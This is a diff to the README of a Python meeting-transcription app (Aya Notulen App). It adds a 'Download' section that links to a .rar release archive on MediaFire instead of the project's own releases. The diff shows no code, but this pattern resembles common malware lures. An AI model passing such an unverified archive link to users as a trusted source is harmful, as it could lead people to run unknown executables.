@@ -38,6 +38,9 @@ Aya Notulen App is a Python-based application designed to automatically record, 
 4. **Download AI Models**:
    - Models (`ecapa_voxceleb`, `whisper_medium`, `t5-indonesian-summarization`) will be downloaded automatically on first run, or manually place them in the `models/` directory.
 
+## Download
+Get the latest release: [Download AyaNotulenApp.rar](https://www.mediafire.com/file/edw9cdztvri04vt/AyaNotulenApp.rar/file)
+
 ## Usage
 Run the application:
 ```bash
